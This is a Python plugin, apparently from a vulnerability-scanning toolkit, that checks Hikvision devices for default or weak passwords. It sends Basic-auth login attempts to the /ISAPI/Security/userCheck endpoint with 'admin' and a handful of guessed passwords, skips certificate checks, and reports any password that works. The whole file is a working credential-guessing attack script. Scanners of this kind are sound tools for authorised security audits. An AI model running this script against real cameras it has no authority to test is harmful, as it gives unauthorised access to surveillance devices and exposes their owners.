# coding:utf-8

import random
import base64
import time
import sys
import requests
import warnings
from exp.lib.gla import getpassdict
import ssl

ssl._create_default_https_context = ssl._create_unverified_context




def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    warnings.filterwarnings("ignore")
    print('testing if hikvision weak password vul')
    error_i = 0
    flag_list = ['>true</']
    user_list = ['admin']
    passdictarr = getpassdict()
    psw_temp = passdictarr.get_pass_dict()
    psw_temp.append('hikvision')
    psw_temp.append('12345')
    psw = random.sample(psw_temp, 3)
    for user in user_list:
        for password in psw:
            try:
                auth_str_temp = user + ':' + password
                auth_str = base64.b64encode(bytes(auth_str_temp, encoding='utf-8'))
                vulnurl = url + '/ISAPI/Security/userCheck'
                headers = {
                    "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
                    "Authorization": "Basic "+auth_str.decode()
                }
                req = requests.get(vulnurl, headers=headers, timeout=3, verify=False)
                time.sleep(2)
                if r"<statusValue>200" in req.text and r"<statusString>OK" in req.text:
                    msg = 'There is hikvision default password vul on url: ' + url + ' with user : '+user + ' and password : ' + password + ' .'
                    number = 'v109'
                    return True, url, number, msg
                else:
                    pass
            except Exception as e:
                msg = str(e)
                number = 'v0'
                return False, url, number, msg
    msg = 'There is no hikvision weak password vul'
    number = 'v0'
    return False, url, number, msg


